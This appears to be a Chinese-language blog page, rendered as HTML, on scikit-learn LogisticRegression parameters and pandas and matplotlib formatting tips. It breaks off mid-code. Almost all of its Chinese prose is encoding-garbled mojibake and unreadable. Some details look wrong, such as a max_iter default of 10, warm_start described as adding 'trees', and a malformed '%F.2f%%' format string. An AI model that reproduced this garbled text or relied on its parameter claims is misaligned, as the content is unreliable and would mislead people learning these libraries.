id="logisticregression">LogisticRegression</span></h3><ul><li><p>penaltyï¼šæƒ©ç½šé¡¹ï¼Œstrç±»å‹ï¼Œå¯é€‰å‚æ•°ä¸ºl1å’Œl2ï¼Œé»˜è®¤ä¸ºl2ã€‚ç”¨äºæŒ‡å®šæƒ©ç½šé¡¹ä¸­ä½¿ç”¨çš„è§„èŒƒã€‚newton-cgã€sagå’Œlbfgsæ±‚è§£ç®—æ³•åªæ”¯æŒL2è§„èŒƒã€‚L1Gè§„èŒƒå‡è®¾çš„æ˜¯æ¨¡å‹çš„å‚æ•°æ»¡è¶³æ‹‰æ™®æ‹‰æ–¯åˆ†å¸ƒï¼ŒL2å‡è®¾çš„æ¨¡å‹å‚æ•°æ»¡è¶³é«˜æ–¯åˆ†å¸ƒï¼Œæ‰€è°“çš„èŒƒå¼å°±æ˜¯åŠ ä¸Šå¯¹å‚æ•°çš„çº¦æŸï¼Œä½¿å¾—æ¨¡å‹æ›´ä¸ä¼šè¿‡æ‹Ÿåˆ(overfit)ï¼Œä½†æ˜¯å¦‚æœè¦è¯´æ˜¯ä¸æ˜¯åŠ äº†çº¦æŸå°±ä¼šå¥½ï¼Œè¿™ä¸ªæ²¡æœ‰äººèƒ½å›ç­”ï¼Œåªèƒ½è¯´ï¼ŒåŠ çº¦æŸçš„æƒ…å†µä¸‹ï¼Œç†è®ºä¸Šåº”è¯¥å¯ä»¥è·å¾—æ³›åŒ–èƒ½åŠ›æ›´å¼ºçš„ç»“æœã€‚</p></li><li><p>dualï¼šå¯¹å¶æˆ–åŸå§‹æ–¹æ³•ï¼Œboolç±»å‹ï¼Œé»˜è®¤ä¸ºFalseã€‚å¯¹å¶æ–¹æ³•åªç”¨åœ¨æ±‚è§£çº¿æ€§å¤šæ ¸(liblinear)çš„L2æƒ©ç½šé¡¹ä¸Šã€‚å½“æ ·æœ¬æ•°é‡&gt;æ ·æœ¬ç‰¹å¾çš„æ—¶å€™ï¼Œdualé€šå¸¸è®¾ç½®ä¸ºFalseã€‚</p></li><li><p>tolï¼šåœæ­¢æ±‚è§£çš„æ ‡å‡†ï¼Œfloatç±»å‹ï¼Œé»˜è®¤ä¸º1e-4ã€‚å°±æ˜¯æ±‚è§£åˆ°å¤šå°‘çš„æ—¶å€™ï¼Œåœæ­¢ï¼Œè®¤ä¸ºå·²ç»æ±‚å‡ºæœ€ä¼˜è§£ã€‚</p></li><li><p>cï¼šæ­£åˆ™åŒ–ç³»æ•°Î»çš„å€’æ•°ï¼Œfloatç±»å‹ï¼Œé»˜è®¤ä¸º1.0ã€‚å¿…é¡»æ˜¯æ­£æµ®ç‚¹å‹æ•°ã€‚åƒSVMä¸€æ ·ï¼Œè¶Šå°çš„æ•°å€¼è¡¨ç¤ºè¶Šå¼ºçš„æ­£åˆ™åŒ–ã€‚</p></li><li><p>fit_interceptï¼šæ˜¯å¦å­˜åœ¨æˆªè·æˆ–åå·®ï¼Œboolç±»å‹ï¼Œé»˜è®¤ä¸ºTrueã€‚</p></li><li><p>intercept_scalingï¼šä»…åœ¨æ­£åˆ™åŒ–é¡¹ä¸ºâ€liblinearâ€ï¼Œä¸”fit_interceptè®¾ç½®ä¸ºTrueæ—¶æœ‰ç”¨ã€‚floatç±»å‹ï¼Œé»˜è®¤ä¸º1ã€‚</p></li><li><p>class_weightï¼šç”¨äºæ ‡ç¤ºåˆ†ç±»æ¨¡å‹ä¸­å„ç§ç±»å‹çš„æƒé‡ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå­—å…¸æˆ–è€…â€™balancedâ€™å­—ç¬¦ä¸²ï¼Œé»˜è®¤ä¸ºä¸è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯ä¸è€ƒè™‘æƒé‡ï¼Œå³ä¸ºNoneã€‚å¦‚æœé€‰æ‹©è¾“å…¥çš„è¯ï¼Œå¯ä»¥é€‰æ‹©balancedè®©ç±»åº“è‡ªå·±è®¡ç®—ç±»å‹æƒé‡ï¼Œæˆ–è€…è‡ªå·±è¾“å…¥å„ä¸ªç±»å‹çš„æƒé‡ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚å¯¹äº0,1çš„äºŒå…ƒæ¨¡å‹ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰class_weight&#x3D;{0:0.9,1:0.1}ï¼Œè¿™æ ·ç±»å‹0çš„æƒé‡ä¸º90%ï¼Œè€Œç±»å‹1çš„æƒé‡ä¸º10%ã€‚å¦‚æœclass_weighté€‰æ‹©balancedï¼Œé‚£ä¹ˆç±»åº“ä¼šæ ¹æ®è®­ç»ƒæ ·æœ¬é‡æ¥è®¡ç®—æƒé‡ã€‚æŸç§ç±»å‹æ ·æœ¬é‡è¶Šå¤šï¼Œåˆ™æƒé‡è¶Šä½ï¼Œæ ·æœ¬é‡è¶Šå°‘ï¼Œåˆ™æƒé‡è¶Šé«˜ã€‚å½“class_weightä¸ºbalancedæ—¶ï¼Œç±»æƒé‡è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼šn_samples &#x2F; (n_classes * np.bincount(y))ã€‚n_samplesä¸ºæ ·æœ¬æ•°ï¼Œn_classesä¸ºç±»åˆ«æ•°é‡ï¼Œnp.bincount(y)ä¼šè¾“å‡ºæ¯ä¸ªç±»çš„æ ·æœ¬æ•°ï¼Œä¾‹å¦‚y&#x3D;[1,0,0,1,1],åˆ™np.bincount(y)&#x3D;[2,3]ã€‚<br>é‚£ä¹ˆclass_weightæœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ</p><p>åœ¨åˆ†ç±»æ¨¡å‹ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ä¸¤ç±»é—®é¢˜ï¼š<br>ç¬¬ä¸€ç§æ˜¯è¯¯åˆ†ç±»çš„ä»£ä»·å¾ˆé«˜ã€‚æ¯”å¦‚å¯¹åˆæ³•ç”¨æˆ·å’Œéæ³•ç”¨æˆ·è¿›è¡Œåˆ†ç±»ï¼Œå°†éæ³•ç”¨æˆ·åˆ†ç±»ä¸ºåˆæ³•ç”¨æˆ·çš„ä»£ä»·å¾ˆé«˜ï¼Œæˆ‘ä»¬å®æ„¿å°†åˆæ³•ç”¨æˆ·åˆ†ç±»ä¸ºéæ³•ç”¨æˆ·ï¼Œè¿™æ—¶å¯ä»¥äººå·¥å†ç”„åˆ«ï¼Œä½†æ˜¯å´ä¸æ„¿å°†éæ³•ç”¨æˆ·åˆ†ç±»ä¸ºåˆæ³•ç”¨æˆ·ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€‚å½“æé«˜éæ³•ç”¨æˆ·çš„æƒé‡ã€‚<br>ç¬¬äºŒç§æ˜¯æ ·æœ¬æ˜¯é«˜åº¦å¤±è¡¡çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬æœ‰åˆæ³•ç”¨æˆ·å’Œéæ³•ç”¨æˆ·çš„äºŒå…ƒæ ·æœ¬æ•°æ®10000æ¡ï¼Œé‡Œé¢åˆæ³•ç”¨æˆ·æœ‰9995æ¡ï¼Œéæ³•ç”¨æˆ·åªæœ‰5æ¡ï¼Œå¦‚æœæˆ‘ä»¬ä¸è€ƒè™‘æƒé‡ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰çš„æµ‹è¯•é›†éƒ½é¢„æµ‹ä¸ºåˆæ³•ç”¨æˆ·ï¼Œè¿™æ ·é¢„æµ‹å‡†ç¡®ç‡ç†è®ºä¸Šæœ‰99.95%ï¼Œä½†æ˜¯å´æ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©balancedï¼Œè®©ç±»åº“è‡ªåŠ¨æé«˜éæ³•ç”¨æˆ·æ ·æœ¬çš„æƒé‡ã€‚æé«˜äº†æŸç§åˆ†ç±»çš„æƒé‡ï¼Œç›¸æ¯”ä¸è€ƒè™‘æƒé‡ï¼Œä¼šæœ‰æ›´å¤šçš„æ ·æœ¬åˆ†ç±»åˆ’åˆ†åˆ°é«˜æƒé‡çš„ç±»åˆ«ï¼Œä»è€Œå¯ä»¥è§£å†³ä¸Šé¢ä¸¤ç±»é—®é¢˜ã€‚</p></li><li><p>random_stateï¼šéšæœºæ•°ç§å­ï¼Œintç±»å‹ï¼Œå¯é€‰å‚æ•°ï¼Œé»˜è®¤ä¸ºæ— ï¼Œä»…åœ¨æ­£åˆ™åŒ–ä¼˜åŒ–ç®—æ³•ä¸ºsag,liblinearæ—¶æœ‰ç”¨ã€‚</p></li><li><p>solverï¼šä¼˜åŒ–ç®—æ³•é€‰æ‹©å‚æ•°ï¼Œåªæœ‰äº”ä¸ªå¯é€‰å‚æ•°ï¼Œå³newton-cg,lbfgs,liblinear,sag,sagaã€‚é»˜è®¤ä¸ºliblinearã€‚solverå‚æ•°å†³å®šäº†æˆ‘ä»¬å¯¹é€»è¾‘å›å½’æŸå¤±å‡½æ•°çš„ä¼˜åŒ–æ–¹æ³•ï¼Œæœ‰å››ç§ç®—æ³•å¯ä»¥é€‰æ‹©ï¼Œåˆ†åˆ«æ˜¯ï¼š</p></li><li><p>liblinearï¼šä½¿ç”¨äº†å¼€æºçš„liblinearåº“å®ç°ï¼Œå†…éƒ¨ä½¿ç”¨äº†åæ ‡è½´ä¸‹é™æ³•æ¥è¿­ä»£ä¼˜åŒ–æŸå¤±å‡½æ•°ã€‚</p></li><li><p>lbfgsï¼šæ‹Ÿç‰›é¡¿æ³•çš„ä¸€ç§ï¼Œåˆ©ç”¨æŸå¤±å‡½æ•°äºŒé˜¶å¯¼æ•°çŸ©é˜µå³æµ·æ£®çŸ©é˜µæ¥è¿­ä»£ä¼˜åŒ–æŸå¤±å‡½æ•°ã€‚</p></li><li><p>newton-cgï¼šä¹Ÿæ˜¯ç‰›é¡¿æ³•å®¶æ—çš„ä¸€ç§ï¼Œåˆ©ç”¨æŸå¤±å‡½æ•°äºŒé˜¶å¯¼æ•°çŸ©é˜µå³æµ·æ£®çŸ©é˜µæ¥è¿­ä»£ä¼˜åŒ–æŸå¤±å‡½æ•°ã€‚</p></li><li><p>sagï¼šå³éšæœºå¹³å‡æ¢¯åº¦ä¸‹é™ï¼Œæ˜¯æ¢¯åº¦ä¸‹é™æ³•çš„å˜ç§ï¼Œå’Œæ™®é€šæ¢¯åº¦ä¸‹é™æ³•çš„åŒºåˆ«æ˜¯æ¯æ¬¡è¿­ä»£ä»…ä»…ç”¨ä¸€éƒ¨åˆ†çš„æ ·æœ¬æ¥è®¡ç®—æ¢¯åº¦ï¼Œé€‚åˆäºæ ·æœ¬æ•°æ®å¤šçš„æ—¶å€™ã€‚</p></li><li><p>sagaï¼šçº¿æ€§æ”¶æ•›çš„éšæœºä¼˜åŒ–ç®—æ³•çš„çš„å˜é‡ã€‚</p></li></ul><p>æ€»ç»“ï¼š<br>liblinearé€‚ç”¨äºå°æ•°æ®é›†ï¼Œè€Œsagå’Œsagaé€‚ç”¨äºå¤§æ•°æ®é›†å› ä¸ºé€Ÿåº¦æ›´å¿«ã€‚<br>å¯¹äºå¤šåˆ†ç±»é—®é¢˜ï¼Œåªæœ‰newton-cg,sag,sagaå’Œlbfgsèƒ½å¤Ÿå¤„ç†å¤šé¡¹æŸå¤±ï¼Œè€Œliblinearå—é™äºä¸€å¯¹å‰©ä½™(OvR)ã€‚å•¥æ„æ€ï¼Œå°±æ˜¯ç”¨liblinearçš„æ—¶å€™ï¼Œå¦‚æœæ˜¯å¤šåˆ†ç±»é—®é¢˜ï¼Œå¾—å…ˆæŠŠä¸€ç§ç±»åˆ«ä½œä¸ºä¸€ä¸ªç±»åˆ«ï¼Œå‰©ä½™çš„æ‰€æœ‰ç±»åˆ«ä½œä¸ºå¦å¤–ä¸€ä¸ªç±»åˆ«ã€‚ä¸€æ¬¡ç±»æ¨ï¼Œéå†æ‰€æœ‰ç±»åˆ«ï¼Œè¿›è¡Œåˆ†ç±»ã€‚<br>newton-cg,sagå’Œlbfgsè¿™ä¸‰ç§ä¼˜åŒ–ç®—æ³•æ—¶éƒ½éœ€è¦æŸå¤±å‡½æ•°çš„ä¸€é˜¶æˆ–è€…äºŒé˜¶è¿ç»­å¯¼æ•°ï¼Œå› æ­¤ä¸èƒ½ç”¨äºæ²¡æœ‰è¿ç»­å¯¼æ•°çš„L1æ­£åˆ™åŒ–ï¼Œåªèƒ½ç”¨äºL2æ­£åˆ™åŒ–ã€‚è€Œliblinearå’Œsagaé€šåƒL1æ­£åˆ™åŒ–å’ŒL2æ­£åˆ™åŒ–ã€‚<br>åŒæ—¶ï¼Œsagæ¯æ¬¡ä»…ä»…ä½¿ç”¨äº†éƒ¨åˆ†æ ·æœ¬è¿›è¡Œæ¢¯åº¦è¿­ä»£ï¼Œæ‰€ä»¥å½“æ ·æœ¬é‡å°‘çš„æ—¶å€™ä¸è¦é€‰æ‹©å®ƒï¼Œè€Œå¦‚æœæ ·æœ¬é‡éå¸¸å¤§ï¼Œæ¯”å¦‚å¤§äº10ä¸‡ï¼Œsagæ˜¯ç¬¬ä¸€é€‰æ‹©ã€‚ä½†æ˜¯sagä¸èƒ½ç”¨äºL1æ­£åˆ™åŒ–ï¼Œæ‰€ä»¥å½“ä½ æœ‰å¤§é‡çš„æ ·æœ¬ï¼Œåˆéœ€è¦L1æ­£åˆ™åŒ–çš„è¯å°±è¦è‡ªå·±åšå–èˆäº†ã€‚è¦ä¹ˆé€šè¿‡å¯¹æ ·æœ¬é‡‡æ ·æ¥é™ä½æ ·æœ¬é‡ï¼Œè¦ä¹ˆå›åˆ°L2æ­£åˆ™åŒ–ã€‚<br>ä»ä¸Šé¢çš„æè¿°ï¼Œå¤§å®¶å¯èƒ½è§‰å¾—ï¼Œæ—¢ç„¶newton-cg, lbfgså’Œsagè¿™ä¹ˆå¤šé™åˆ¶ï¼Œå¦‚æœä¸æ˜¯å¤§æ ·æœ¬ï¼Œæˆ‘ä»¬é€‰æ‹©liblinearä¸å°±è¡Œäº†å˜›ï¼é”™ï¼Œå› ä¸ºliblinearä¹Ÿæœ‰è‡ªå·±çš„å¼±ç‚¹ï¼æˆ‘ä»¬çŸ¥é“ï¼Œé€»è¾‘å›å½’æœ‰äºŒå…ƒé€»è¾‘å›å½’å’Œå¤šå…ƒé€»è¾‘å›å½’ã€‚å¯¹äºå¤šå…ƒé€»è¾‘å›å½’å¸¸è§çš„æœ‰one-vs-rest(OvR)å’Œmany-vs-many(MvM)ä¸¤ç§ã€‚è€ŒMvMä¸€èˆ¬æ¯”OvRåˆ†ç±»ç›¸å¯¹å‡†ç¡®ä¸€äº›ã€‚éƒé—·çš„æ˜¯liblinearåªæ”¯æŒOvRï¼Œä¸æ”¯æŒMvMï¼Œè¿™æ ·å¦‚æœæˆ‘ä»¬éœ€è¦ç›¸å¯¹ç²¾ç¡®çš„å¤šå…ƒé€»è¾‘å›å½’æ—¶ï¼Œå°±ä¸èƒ½é€‰æ‹©liblinearäº†ã€‚ä¹Ÿæ„å‘³ç€å¦‚æœæˆ‘ä»¬éœ€è¦ç›¸å¯¹ç²¾ç¡®çš„å¤šå…ƒé€»è¾‘å›å½’ä¸èƒ½ä½¿ç”¨L1æ­£åˆ™åŒ–äº†ã€‚<br>max_iterï¼šç®—æ³•æ”¶æ•›æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼Œintç±»å‹ï¼Œé»˜è®¤ä¸º10ã€‚ä»…åœ¨æ­£åˆ™åŒ–ä¼˜åŒ–ç®—æ³•ä¸ºnewton-cg, sagå’Œlbfgsæ‰æœ‰ç”¨ï¼Œç®—æ³•æ”¶æ•›çš„æœ€å¤§è¿­ä»£æ¬¡æ•°ã€‚</p><ul><li><p>multi_classï¼šåˆ†ç±»æ–¹å¼é€‰æ‹©å‚æ•°ï¼Œstrç±»å‹ï¼Œå¯é€‰å‚æ•°ä¸ºovrå’Œmultinomialï¼Œé»˜è®¤ä¸ºovrã€‚ovrå³å‰é¢æåˆ°çš„one-vs-rest(OvR)ï¼Œè€Œmultinomialå³å‰é¢æåˆ°çš„many-vs-many(MvM)ã€‚å¦‚æœæ˜¯äºŒå…ƒé€»è¾‘å›å½’ï¼Œovrå’Œmultinomialå¹¶æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼ŒåŒºåˆ«ä¸»è¦åœ¨å¤šå…ƒé€»è¾‘å›å½’ä¸Šã€‚</p></li><li><p>OvRå’ŒMvMæœ‰ä»€ä¹ˆä¸åŒ<em>ï¼Ÿ</em><br>OvRçš„æ€æƒ³å¾ˆç®€å•ï¼Œæ— è®ºä½ æ˜¯å¤šå°‘å…ƒé€»è¾‘å›å½’ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥çœ‹åšäºŒå…ƒé€»è¾‘å›å½’ã€‚å…·ä½“åšæ³•æ˜¯ï¼Œå¯¹äºç¬¬Kç±»çš„åˆ†ç±»å†³ç­–ï¼Œæˆ‘ä»¬æŠŠæ‰€æœ‰ç¬¬Kç±»çš„æ ·æœ¬ä½œä¸ºæ­£ä¾‹ï¼Œé™¤äº†ç¬¬Kç±»æ ·æœ¬ä»¥å¤–çš„æ‰€æœ‰æ ·æœ¬éƒ½ä½œä¸ºè´Ÿä¾‹ï¼Œç„¶ååœ¨ä¸Šé¢åšäºŒå…ƒé€»è¾‘å›å½’ï¼Œå¾—åˆ°ç¬¬Kç±»çš„åˆ†ç±»æ¨¡å‹ã€‚å…¶ä»–ç±»çš„åˆ†ç±»æ¨¡å‹è·å¾—ä»¥æ­¤ç±»æ¨ã€‚<br>è€ŒMvMåˆ™ç›¸å¯¹å¤æ‚ï¼Œè¿™é‡Œä¸¾MvMçš„ç‰¹ä¾‹one-vs-one(OvO)ä½œè®²è§£ã€‚å¦‚æœæ¨¡å‹æœ‰Tç±»ï¼Œæˆ‘ä»¬æ¯æ¬¡åœ¨æ‰€æœ‰çš„Tç±»æ ·æœ¬é‡Œé¢é€‰æ‹©ä¸¤ç±»æ ·æœ¬å‡ºæ¥ï¼Œä¸å¦¨è®°ä¸ºT1ç±»å’ŒT2ç±»ï¼ŒæŠŠæ‰€æœ‰çš„è¾“å‡ºä¸ºT1å’ŒT2çš„æ ·æœ¬æ”¾åœ¨ä¸€èµ·ï¼ŒæŠŠT1ä½œä¸ºæ­£ä¾‹ï¼ŒT2ä½œä¸ºè´Ÿä¾‹ï¼Œè¿›è¡ŒäºŒå…ƒé€»è¾‘å›å½’ï¼Œå¾—åˆ°æ¨¡å‹å‚æ•°ã€‚æˆ‘ä»¬ä¸€å…±éœ€è¦T(T-1)&#x2F;2æ¬¡åˆ†ç±»ã€‚<br>å¯ä»¥çœ‹å‡ºOvRç›¸å¯¹ç®€å•ï¼Œä½†åˆ†ç±»æ•ˆæœç›¸å¯¹ç•¥å·®ï¼ˆè¿™é‡ŒæŒ‡å¤§å¤šæ•°æ ·æœ¬åˆ†å¸ƒæƒ…å†µï¼ŒæŸäº›æ ·æœ¬åˆ†å¸ƒä¸‹OvRå¯èƒ½æ›´å¥½ï¼‰ã€‚è€ŒMvMåˆ†ç±»ç›¸å¯¹ç²¾ç¡®ï¼Œä½†æ˜¯åˆ†ç±»é€Ÿåº¦æ²¡æœ‰OvRå¿«ã€‚å¦‚æœé€‰æ‹©äº†ovrï¼Œåˆ™4ç§æŸå¤±å‡½æ•°çš„ä¼˜åŒ–æ–¹æ³•liblinearï¼Œnewton-cg,lbfgså’Œsagéƒ½å¯ä»¥é€‰æ‹©ã€‚ä½†æ˜¯å¦‚æœé€‰æ‹©äº†multinomial,åˆ™åªèƒ½é€‰æ‹©newton-cg, lbfgså’Œsagäº†ã€‚</p></li><li><p>verboseï¼šæ—¥å¿—å†—é•¿åº¦ï¼Œintç±»å‹ã€‚é»˜è®¤ä¸º0ã€‚å°±æ˜¯ä¸è¾“å‡ºè®­ç»ƒè¿‡ç¨‹ï¼Œ1çš„æ—¶å€™å¶å°”è¾“å‡ºç»“æœï¼Œå¤§äº1ï¼Œå¯¹äºæ¯ä¸ªå­æ¨¡å‹éƒ½è¾“å‡ºã€‚</p></li><li><p>warm_startï¼šçƒ­å¯åŠ¨å‚æ•°ï¼Œboolç±»å‹ã€‚é»˜è®¤ä¸ºFalseã€‚å¦‚æœä¸ºTrueï¼Œåˆ™ä¸‹ä¸€æ¬¡è®­ç»ƒæ˜¯ä»¥è¿½åŠ æ ‘çš„å½¢å¼è¿›è¡Œï¼ˆé‡æ–°ä½¿ç”¨ä¸Šä¸€æ¬¡çš„è°ƒç”¨ä½œä¸ºåˆå§‹åŒ–ï¼‰ã€‚</p></li><li><p>n_jobsï¼šå¹¶è¡Œæ•°ã€‚intç±»å‹ï¼Œé»˜è®¤ä¸º1ã€‚1çš„æ—¶å€™ï¼Œç”¨CPUçš„ä¸€ä¸ªå†…æ ¸è¿è¡Œç¨‹åºï¼Œ2çš„æ—¶å€™ï¼Œç”¨CPUçš„2ä¸ªå†…æ ¸è¿è¡Œç¨‹åºã€‚ä¸º-1çš„æ—¶å€™ï¼Œç”¨æ‰€æœ‰CPUçš„å†…æ ¸è¿è¡Œç¨‹åºã€‚</p></li></ul><h2><span id="åšé¢˜é‡åˆ°çš„">åšé¢˜é‡åˆ°çš„</span></h2><h3><span id="æ•°æ®æ ¼å¼åŒ–map">æ•°æ®æ ¼å¼åŒ–map</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°† df2 çš„è·å¥–æ—¶é—´æ ¼å¼åŒ–ä¸º xæœˆxæ—¥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_format</span>(<span class="params">x</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> x.strftime(<span class="string">&quot;%mæœˆ%dæ—¥&quot;</span>)</span><br><span class="line"></span><br><span class="line">df2[<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>] = df2[<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>].<span class="built_in">map</span>(time_format)</span><br><span class="line"><span class="comment"># ç­‰åŒäº</span></span><br><span class="line">df2.è·å¥–æ—¶é—´.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.strftime(<span class="string">&#x27;%mæœˆ%dæ—¥&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">turn_percentage</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%F.2f%%&#x27;</span> % (x * <span class="number">100</span>);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>]=q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>].apply(turn_percentage)</span><br><span class="line">q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>]=q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="string">&quot;&#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå°æ•°</span></span><br><span class="line">pd.set_option(<span class="string">&#x27;precision&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mapä¼ å­—å…¸</span></span><br><span class="line">df1[<span class="string">&#x27;A&#x27;</span>] = df1[<span class="string">&#x27;A&#x27;</span>].<span class="built_in">map</span>(&#123;<span class="string">&#x27;A0&#x27;</span>:<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;A3&#x27;</span>:<span class="string">&#x27;rabbit&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># map ignore</span></span><br><span class="line">df1[<span class="string">&#x27;B&#x27;</span>] = df1[<span class="string">&#x27;B&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span> ä»Šå¤©å…³æ³¨äº†æ—©èµ·Python&#x27;</span>, na_action=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#applymapå¯ä»¥å¯¹æ•´ä¸ª dataframe å·¥ä½œï¼Œç°åœ¨å°† df1 çš„æœ€åä¸‰åˆ—ä¿ç•™ä¸¤ä½å°æ•°</span></span><br><span class="line"></span><br><span class="line">df1[[<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>]] = df1[[<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>]].applymap(<span class="keyword">lambda</span> x:<span class="built_in">format</span>(x,<span class="string">&#x27;.2f&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="ç´¢å¼•">ç´¢å¼•</span></h3><ul><li><code>reset_index</code>ç”¨äºå°†ç´¢å¼•è¿˜åŸæˆé»˜è®¤å€¼ï¼Œå³ä»0å¼€å§‹æ­¥é•¿ä¸º1çš„æ•°ç»„ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">q1_df[<span class="string">&#x27;rate&#x27;</span>] = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>])+<span class="number">1</span>)]</span><br><span class="line"><span class="comment"># å¦‚æœç´¢å¼•ä¸æ˜¯é»˜è®¤</span></span><br><span class="line">q1_df.reset_index().set_index(q1_df[<span class="string">&#x27;rate&#x27;</span>])</span><br><span class="line"><span class="comment"># å¦‚æœæ˜¯é»˜è®¤</span></span><br><span class="line">q1_df.set_index(q1_df[<span class="string">&#x27;rate&#x27;</span>],inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤ç´¢å¼•</span></span><br><span class="line">max_data=max_data.reset_index(drop=<span class="literal">True</span>).set_index(max_data[<span class="string">&#x27;DATA_DATE&#x27;</span>])</span><br><span class="line"><span class="comment"># ä¿®æ”¹ç´¢å¼•å</span></span><br><span class="line">df.rename_axis([<span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>, <span class="string">&quot;å…¬å¸è§„æ¨¡&quot;</span>],inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="åæ ‡è½´æ˜¾ç¤ºç™¾åˆ†æ¯”">åæ ‡è½´æ˜¾ç¤ºç™¾åˆ†æ¯”</span></h3><ul><li>ç¬¬ä¸€ç§æ–¹æ³•</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.ticker <span class="keyword">import</span> FuncFormatter</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_percent</span>(<span class="params">temp, position</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%1.0f&#x27;</span>%(<span class="number">100</span>*temp) + <span class="string">&#x27;%&#x27;</span></span><br><span class="line">plt.gca().yaxis.set_major_formatter(FuncFormatter(to_percent))</span><br></pre></td></tr></table></figure><ul><li>æ¨è</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.set_yticklabels([<span class="string">&#x27;0%&#x27;</span>,<span class="string">&#x27;10%&#x27;</span>,<span class="string">&#x27;20%&#x27;</span>,<span class="string">&#x27;30%&#x27;</span>,<span class="string">&#x27;40%&#x27;</span>,<span class="string">&#x27;50%&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="apply">apply</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ„å»ºapplyå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_state</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">if</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>] &lt;=<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Off&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>]&gt;<span class="number">0.01</span>:</span><br><span class="line">        <span 